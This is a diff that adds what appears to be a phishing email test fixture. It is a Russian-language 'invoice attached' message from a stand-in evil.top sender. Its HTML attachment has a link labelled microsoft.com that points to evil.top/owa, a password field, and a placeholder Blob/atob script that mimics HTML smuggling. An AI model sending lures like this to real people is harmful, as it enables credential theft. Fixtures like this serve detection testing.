@@ -1,0 +1,22 @@
+From: phish@evil.top
+To: victim@company.local
+Subject: Счёт во вложении
+Message-ID: <html_att@evil.top>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="H"
+
+--H
+Content-Type: text/plain; charset=utf-8
+
+Документ во вложении.
+--H
+Content-Type: text/html; name="login.html"
+Content-Disposition: attachment; filename="login.html"
+Content-Transfer-Encoding: 7bit
+
+<html><body>
+<a href="https://evil.top/owa">microsoft.com</a>
+<form><input type="password" name="p"></form>
+<script>var b=new Blob(["x"]); atob("QQ==");</script>
+</body></html>
+--H--
